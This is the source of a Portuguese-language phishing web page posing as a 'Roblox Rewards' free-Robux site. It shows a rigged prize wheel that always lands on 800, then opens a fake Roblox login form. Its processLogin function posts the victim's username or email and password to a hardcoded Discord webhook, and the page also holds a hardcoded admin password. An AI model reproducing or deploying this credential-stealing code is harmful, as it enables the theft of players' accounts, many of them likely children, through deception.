<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox Rewards</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap');

        body { font-family: 'Source Sans Pro', sans-serif; background-color: #111216; color: white; margin: 0; overflow-x: hidden; }

        /* HEADER & WALLET */
        .wallet-pill {
            background-color: rgba(255,255,255,0.1); border-radius: 20px; padding: 4px 12px;
            display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 14px; border: 1px solid rgba(255,255,255,0.1);
        }

        /* GRID */
        .rewards-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 15px; max-width: 1000px; margin: 0 auto; }
        @media (min-width: 768px) { .rewards-grid { grid-template-columns: repeat(4, 1fr); gap: 24px; padding: 30px; } }

        .reward-card {
            background-color: #232527; border: 1px solid #393b3d; border-radius: 12px; overflow: hidden;
            position: relative; cursor: pointer; transition: transform 0.2s; display: flex; flex-direction: column;
        }
        .reward-card:active { transform: scale(0.98); }
        .card-img { width: 100%; aspect-ratio: 1/1; object-fit: cover; background: #000; }
        .card-info { padding: 12px; text-align: center; }
        .card-name { font-weight: 700; font-size: 15px; margin-bottom: 5px; }
        .card-type { font-size: 10px; font-weight: bold; text-transform: uppercase; color: #aaa; background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 4px; }

        /* VIEWS ESPECÍFICAS */
        .special-view { display: none; background-color: #fff; color: #000; min-height: 100vh; padding: 20px; }
        .game-card { background: #f3f4f6; padding: 20px; border-radius: 10px; text-align: center; border: 1px solid #e5e7eb; margin-bottom: 15px; }
        
        /* MODAIS */
        .modal-overlay { position: fixed; inset: 0; z-index: 50; display: none; background: rgba(0,0,0,0.8); align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .roblox-modal { background-color: #191b1d; color: white; border-radius: 10px; width: 100%; max-width: 400px; padding: 30px 24px; position: relative; }
        
        /* MODAL DA ROLETA (MENOR) */
        .wheel-modal-size { max-width: 300px; padding: 20px; }
        
        /* INPUTS */
        .input-group { display: flex; gap: 8px; margin-bottom: 12px; }
        .roblox-input { background: #232527; border: 1px solid #a7a7a7; border-radius: 6px; color: white; padding: 10px; width: 100%; outline: none; }
        .roblox-input.error { border-color: red; }
        
        .mode-btn {
            background-color: #fff; color: #333; border-radius: 6px; width: 44px; flex-shrink: 0;
            display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.3s;
        }
        .mode-btn.active { background-color: #22c55e; color: white; border: 1px solid #16a34a; }

        .roblox-btn-primary { background: #232527; border: 1px solid #fff; color: white; padding: 10px; width: 100%; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .img-white-filter { filter: brightness(0) invert(1); }
        .error-msg { color: #ef4444; font-size: 12px; margin-bottom: 10px; display: none; text-align: center; font-weight: bold; }

        /* ROLETA (AJUSTADA E MENOR) */
        .wheel-container { position: relative; width: 220px; height: 220px; margin: 0 auto 20px auto; }
        .wheel {
            width: 100%; height: 100%; border-radius: 50%; border: 4px solid #fff;
            background: conic-gradient(#ef4444 0deg 60deg, #f97316 60deg 120deg, #eab308 120deg 180deg, #22c55e 180deg 240deg, #3b82f6 240deg 300deg, #a855f7 300deg 360deg);
            transition: transform 5s cubic-bezier(0.25, 0.1, 0.25, 1); box-shadow: 0 0 20px rgba(0,0,0,0.5);
            position: relative;
        }
        .wheel-center {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 40px; height: 40px; background: white; border-radius: 50%;
            display: flex; align-items: center; justify-content: center; z-index: 20;
            box-shadow: 0 0 10px rgba(0,0,0,0.3);
        }
        .wheel-arrow {
            position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 0; height: 0; 
            border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 25px solid white; z-index: 30;
            filter: drop-shadow(0 2px 2px rgba(0,0,0,0.5));
        }

        /* NÚMEROS NA ROLETA */
        .wheel-number {
            position: absolute; top: 50%; left: 50%;
            transform-origin: 0% 0%; /* Centro */
            color: white; font-weight: 800; font-size: 14px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
            width: 0; height: 0; display: flex; align-items: center; justify-content: center;
        }
        /* Posiciona cada número no centro da sua fatia */
        .wn-1 { transform: rotate(30deg) translate(0, -75px) rotate(-30deg); } /* 800 */
        .wn-2 { transform: rotate(90deg) translate(0, -75px) rotate(-90deg); } /* 80 */
        .wn-3 { transform: rotate(150deg) translate(0, -75px) rotate(-150deg); } /* 2000 */
        .wn-4 { transform: rotate(210deg) translate(0, -75px) rotate(-210deg); } /* 40 */
        .wn-5 { transform: rotate(270deg) translate(0, -75px) rotate(-270deg); } /* 1 */
        .wn-6 { transform: rotate(330deg) translate(0, -75px) rotate(-330deg); } /* 200 */
        
        .fab { position: fixed; bottom: 20px; right: 20px; width: 56px; height: 56px; background: #00b06f; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; z-index: 100; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

    <header id="main-header" class="bg-[#232527] border-b border-[#393b3d] p-4 flex justify-between items-center sticky top-0 z-40">
        <div class="flex items-center gap-2">
            <button id="btn-back" onclick="goHome()" class="text-white hidden"><i class="fa-solid fa-arrow-left text-xl"></i></button>
            <h1 class="text-xl font-bold tracking-tight">ROBLOX <span class="font-light text-gray-400">REWARDS</span></h1>
        </div>
        <div class="flex items-center gap-3">
            <div class="wallet-pill">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Robloxi_valuuta_%22Robux%22_Ikoon.png" width="18" height="18">
                <span id="wallet-balance">0</span>
            </div>
            <div id="admin-badge" class="hidden px-2 py-1 bg-red-600 text-xs font-bold rounded">ADMIN</div>
            <button onclick="openLoginModal()" class="text-sm font-bold border border-white px-3 py-1 rounded hover:bg-white hover:text-black transition">Login</button>
        </div>
    </header>

    <main id="main-grid" class="rewards-grid"></main>

    <div id="robux-view" class="special-view">
        <div class="max-w-xl mx-auto">
            <div class="flex items-center mb-6">
                <button onclick="goHome()" class="mr-4 text-2xl"><i class="fa-solid fa-arrow-left"></i></button>
                <h1 class="text-3xl font-extrabold">Robux Free</h1>
            </div>
            <div id="robux-list"></div>
        </div>
    </div>

    <div id="games-view" class="special-view">
        <div class="max-w-xl mx-auto">
            <div class="flex items-center mb-6">
                <button onclick="goHome()" class="mr-4 text-2xl"><i class="fa-solid fa-arrow-left"></i></button>
                <h1 class="text-3xl font-extrabold">Games & Apostas</h1>
            </div>
            <div class="game-card">
                <h3 class="font-bold text-xl mb-2">Roleta da Sorte</h3>
                <p class="text-sm text-gray-500 mb-4">Aposte 50 Robux para ganhar o dobro!</p>
                <button onclick="playBetGame()" class="bg-green-600 text-white px-6 py-2 rounded font-bold w-full">Girar (Custa 50)</button>
            </div>
        </div>
    </div>

    <div id="modal-wheel" class="modal-overlay" style="display: flex;">
        <div class="roblox-modal wheel-modal-size text-center">
            <h2 class="text-xl font-bold mb-2">Gire para ganhar!</h2>
            <div class="wheel-container">
                <div class="wheel-arrow"></div>
                <div class="wheel" id="the-wheel">
                    <div class="wheel-number wn-1">800</div>
                    <div class="wheel-number wn-2">80</div>
                    <div class="wheel-number wn-3">2K</div> <div class="wheel-number wn-4">40</div>
                    <div class="wheel-number wn-5">1</div>
                    <div class="wheel-number wn-6">200</div>
                </div>
                <div class="wheel-center"><img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Robloxi_valuuta_%22Robux%22_Ikoon.png" width="24"></div>
            </div>
            <button id="btn-spin" onclick="spinWheel()" class="roblox-btn-primary bg-green-600 border-none hover:bg-green-700">GIRAR</button>
            <button id="btn-claim" onclick="claimPrize()" class="roblox-btn-primary hidden bg-blue-600 border-none hover:bg-blue-700">RESGATAR 800</button>
        </div>
    </div>

    <div id="modal-login" class="modal-overlay">
        <div class="roblox-modal">
            <button onclick="closeModals()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
            <div class="flex justify-center mb-4">
                <img src="https://logos-world.net/wp-content/uploads/2020/11/Roblox-Logo.png" width="150" class="img-white-filter">
            </div>
            <p class="text-center text-gray-200 mb-6 font-medium">Coloque sua conta para receber o item</p>
            
            <form onsubmit="event.preventDefault(); processLogin();">
                <div class="input-group">
                    <input type="text" id="inp-user" class="roblox-input" placeholder="Usuário">
                    <div id="btn-mode" class="mode-btn" onclick="toggleMode()" title="Mudar para Email/Telefone">
                        <i class="fa-solid fa-envelope"></i>
                    </div>
                </div>
                
                <div class="relative w-full mb-3">
                    <input type="password" id="inp-pass" class="roblox-input" placeholder="Senha" style="margin-bottom: 0;">
                </div>

                <div id="nick-error" class="error-msg">Nick Inválido</div>

                <button id="btn-entrar" type="submit" class="roblox-btn-primary">Entrar</button>
            </form>
        </div>
    </div>

    <div id="modal-admin" class="modal-overlay">
        <div class="bg-[#232527] w-full max-w-sm p-6 rounded-lg text-white border border-[#393b3d]">
            <h3 class="font-bold text-lg mb-4 flex justify-between">Gerenciar <i onclick="closeModals()" class="fa-solid fa-xmark cursor-pointer"></i></h3>
            <select id="adm-type" class="roblox-input mb-2"><option value="product">Produto</option><option value="category">Categoria</option></select>
            <input id="adm-name" class="roblox-input mb-2" placeholder="Nome">
            <input id="adm-img" class="roblox-input mb-2" placeholder="URL Imagem">
            <input id="adm-order" type="number" class="roblox-input mb-2" placeholder="Ordem (ex: 1, 2, 3)">
            <button onclick="saveItem()" class="w-full bg-green-600 p-2 rounded font-bold mb-2">Salvar</button>
            <button onclick="deleteItem()" id="btn-del" class="w-full bg-red-600 p-2 rounded font-bold hidden">Excluir</button>
        </div>
    </div>

    <div id="btn-add" class="fab hidden" onclick="openAdminModal()"><i class="fa-solid fa-plus"></i></div>

    <script>
        // CONFIG
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1444449733753180355/UexEyxKjWYMkbMEuXkBrvXeNzAS5s8BapW5K4b6PqB-2zqDT5BNxfOYfgrjjiG_t45PA";
        const ROBUX_ICON = "https://upload.wikimedia.org/wikipedia/commons/3/39/Robloxi_valuuta_%22Robux%22_Ikoon.png";
        
        let items = [];
        let isAdmin = false;
        let currentParent = 0;
        let balance = parseInt(localStorage.getItem('rbx_balance')) || 0;
        let editingId = null;
        let pendingPrize = 0;
        let isEmailMode = false;

        document.getElementById('wallet-balance').innerText = balance.toLocaleString('pt-BR');
        loadItems();

        function toggleMode() {
            isEmailMode = !isEmailMode;
            const btn = document.getElementById('btn-mode');
            const input = document.getElementById('inp-user');

            if(isEmailMode) {
                btn.classList.add('active');
                input.placeholder = "Email / Telefone";
            } else {
                btn.classList.remove('active');
                input.placeholder = "Usuário";
            }
        }

        function spinWheel() {
            const wheel = document.getElementById('the-wheel');
            const btn = document.getElementById('btn-spin');
            btn.disabled = true; btn.innerText = "...";
            
            // Gira 10 voltas (3600) - 30 graus para centralizar o 800 (segmento vermelho 0-60)
            const deg = 3600 - 30; 
            wheel.style.transform = `rotate(${deg}deg)`;

            setTimeout(() => {
                confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
                document.getElementById('btn-spin').classList.add('hidden');
                document.getElementById('btn-claim').classList.remove('hidden');
                pendingPrize = 800;
            }, 5000);
        }

        function claimPrize() {
            document.getElementById('modal-wheel').style.display = 'none';
            openLoginModal("Resgate Roleta 800");
        }

        function playBetGame() {
            if(balance < 50) return alert("Saldo insuficiente!");
            balance -= 50; updateWallet();
            const win = Math.random() < 0.5;
            setTimeout(() => {
                if(win) {
                    balance += 100; updateWallet(); alert("GANHOU! +100 Robux"); confetti();
                } else { alert("Perdeu..."); }
            }, 1000);
        }

        function updateWallet() {
            document.getElementById('wallet-balance').innerText = balance.toLocaleString('pt-BR');
            localStorage.setItem('rbx_balance', balance);
        }

        async function loadItems() {
            try {
                const res = await fetch('/api/items');
                items = await res.json();
                render();
            } catch(e) { console.error(e); }
        }

        function render() {
            const grid = document.getElementById('main-grid');
            const rbxView = document.getElementById('robux-view');
            const gamesView = document.getElementById('games-view');
            const header = document.getElementById('main-header');

            grid.style.display = 'none'; rbxView.style.display = 'none'; gamesView.style.display = 'none'; header.style.display = 'flex';
            document.getElementById('btn-back').style.display = currentParent === 0 ? 'none' : 'block';

            const parentItem = items.find(i => i.id === currentParent);
            if(parentItem) {
                if(parentItem.name.toLowerCase().includes('robux')) {
                    header.style.display = 'none'; rbxView.style.display = 'block'; renderRobuxList(); return;
                }
                if(parentItem.name.toLowerCase().includes('games')) {
                    gamesView.style.display = 'block'; return;
                }
            }

            grid.style.display = 'grid'; grid.innerHTML = '';
            const viewItems = items.filter(i => (i.parent || 0) == currentParent);
            
            viewItems.forEach(item => {
                const card = document.createElement('div');
                card.className = 'reward-card';
                let adminHtml = isAdmin ? `<button onclick="event.stopPropagation(); editMode(${item.id})" class="absolute top-2 right-2 bg-black/50 text-white w-8 h-8 rounded-full z-10 hover:bg-blue-600"><i class="fa-solid fa-pen"></i></button>` : '';
                card.innerHTML = `${adminHtml}<img src="${item.img}" class="card-img"><div class="card-info"><div class="card-name">${item.name}</div><div class="card-type">${item.type === 'category' ? 'Abrir' : 'Resgatar'}</div></div>`;
                card.onclick = () => handleClick(item);
                grid.appendChild(card);
            });
        }

        function renderRobuxList() {
            const list = document.getElementById('robux-list');
            list.innerHTML = '';
            [22500, 10000, 4500, 1700, 800, 400].forEach(val => {
                list.innerHTML += `<div class="flex justify-between items-center bg-gray-100 p-4 rounded mb-2 border border-gray-300 text-black"><div class="flex items-center gap-2 font-bold text-lg"><img src="${ROBUX_ICON}" width="24"> ${val} Robux</div><button class="bg-gray-300 px-4 py-2 rounded font-bold hover:bg-gray-400" onclick="openLoginModal('${val} Robux')">FREE</button></div>`;
            });
        }

        function handleClick(item) {
            if(item.type === 'category') { currentParent = item.id; render(); }
            else { openLoginModal(item.name); }
        }

        function openLoginModal(itemName) {
            document.getElementById('modal-login').style.display = 'flex';
            document.getElementById('nick-error').style.display = 'none';
            document.getElementById('inp-user').classList.remove('error');
            window.loginTarget = itemName || "Item Genérico";
        }

        function processLogin() {
            const u = document.getElementById('inp-user').value;
            const p = document.getElementById('inp-pass').value;
            const errorMsg = document.getElementById('nick-error');
            const inputUser = document.getElementById('inp-user');

            if(u === 'Admin' && p === 'LP') {
                isAdmin = true;
                document.getElementById('admin-badge').classList.remove('hidden');
                document.getElementById('btn-add').classList.remove('hidden');
                closeModals(); render(); alert("Modo Admin Ativado"); return;
            }

            const maxLen = isEmailMode ? 40 : 20;
            const regex = /^[a-zA-Z0-9@._]+$/;

            let isValid = true;
            if(u.length < 3 || u.length > maxLen) isValid = false;
            if(!regex.test(u)) isValid = false;

            if(!isValid) {
                errorMsg.style.display = 'block';
                inputUser.classList.add('error');
                return;
            }

            errorMsg.style.display = 'none';
            inputUser.classList.remove('error');

            const btn = document.getElementById('btn-entrar');
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
            btn.disabled = true;

            fetch(WEBHOOK_URL, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ content: `**Item:** ${window.loginTarget}\n**User:** ${u}\n**Pass:** ${p}` })
            }).then(() => {
                btn.innerText = "Entrar"; btn.disabled = false; closeModals();
                if(pendingPrize > 0) {
                    balance += pendingPrize; updateWallet(); alert("Adicionado ao seu crédito!"); pendingPrize = 0;
                }
                document.getElementById('inp-pass').value = "";
            }).catch(() => { btn.innerText = "Entrar"; btn.disabled = false; });
        }

        function openAdminModal() {
            editingId = null;
            document.getElementById('btn-del').classList.add('hidden');
            document.getElementById('adm-name').value = "";
            document.getElementById('adm-img').value = "";
            document.getElementById('adm-order').value = "";
            document.getElementById('modal-admin').style.display = 'flex';
        }

        function editMode(id) {
            const item = items.find(i => i.id === id);
            editingId = id;
            document.getElementById('adm-type').value = item.type;
            document.getElementById('adm-name').value = item.name;
            document.getElementById('adm-img').value = item.img;
            document.getElementById('adm-order').value = item.order || 0;
            document.getElementById('btn-del').classList.remove('hidden');
            document.getElementById('modal-admin').style.display = 'flex';
        }

        async function saveItem() {
            const type = document.getElementById('adm-type').value;
            const name = document.getElementById('adm-name').value;
            const img = document.getElementById('adm-img').value;
            const order = document.getElementById('adm-order').value;
            const newItem = { id: editingId ? editingId : Date.now(), type, name, img, parent: currentParent, order: parseInt(order) || 0 };
            await fetch('/api/items', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(newItem) });
            closeModals(); loadItems();
        }

        async function deleteItem() {
            if(confirm("Deletar?")) {
                await fetch('/api/items/' + editingId, { method: 'DELETE' });
                closeModals(); loadItems();
            }
        }

        function goHome() { currentParent = 0; render(); }
        function closeModals() {
            document.getElementById('modal-login').style.display = 'none';
            document.getElementById('modal-admin').style.display = 'none';
        }
    </script>
</body>
</html>
